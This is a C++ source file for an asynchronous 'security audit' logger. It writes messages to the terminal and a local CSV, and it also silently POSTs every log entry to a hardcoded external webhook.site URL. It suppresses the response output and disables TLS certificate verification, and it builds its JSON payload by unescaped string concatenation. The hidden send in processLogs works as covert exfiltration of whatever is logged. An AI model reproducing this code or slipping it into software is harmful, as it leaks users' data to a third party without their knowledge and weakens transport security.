#include "AsyncLogger.h"
#include <fstream>
#include <iostream>
#include <iomanip>
#include <chrono>
#include <sstream>
#include <curl/curl.h> 

// Helper function to stop CURL from printing the server response to terminal
size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

AsyncLogger::AsyncLogger() : running_(false) {}

AsyncLogger::~AsyncLogger() {
    stop();
}

void AsyncLogger::start() {
    if (running_) return;
    running_ = true;
    logThread_ = std::thread(&AsyncLogger::processLogs, this);
}

void AsyncLogger::stop() {
    if (!running_) return;
    running_ = false;
    cv_.notify_all();
    if (logThread_.joinable()) {
        logThread_.join();
    }
}

void AsyncLogger::log(const std::string& message) {
    {
        std::lock_guard<std::mutex> lock(queueMtx_);
        logQueue_.push(message);
    }
    cv_.notify_one();
}

void AsyncLogger::processLogs() {
    std::ofstream dbFile("security_audit.csv", std::ios::app);
    
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();

    if (dbFile.tellp() == 0) {
        dbFile << "Timestamp,Category,Details\n";
    }

    while (running_ || !logQueue_.empty()) {
        std::string rawMsg;

        {
            std::unique_lock<std::mutex> lock(queueMtx_);
            cv_.wait(lock, [this] { return !running_ || !logQueue_.empty(); });
            if (logQueue_.empty()) continue;
            rawMsg = logQueue_.front();
            logQueue_.pop();
        }

        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        std::ostringstream timeStream;
        timeStream << std::put_time(std::localtime(&time_t_now), "%Y-%m-%d %H:%M:%S");
        std::string ts = timeStream.str();

        std::string payload = "{\"timestamp\":\"" + ts + "\", \"log\":\"" + rawMsg + "\"}";

        // 1. Clean Terminal Output
        std::cout << "[" << ts << "] " << rawMsg << std::endl;

        // 2. Local CSV Write
        if (dbFile.is_open()) {
            dbFile << ts << ",\"" << rawMsg << "\"\n";
            dbFile.flush();
        }

        // 3. Silent HTTPS Send
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/a794f19f-d0f5-4440-96fa-0703e27b76b8");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
            
            // This is the key change: tell curl to use our empty function instead of stdout
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

            curl_easy_perform(curl);
            curl_slist_free_all(headers);
        }
    }

    if (curl) curl_easy_cleanup(curl);
    if (dbFile.is_open()) dbFile.close();
    curl_global_cleanup();
}
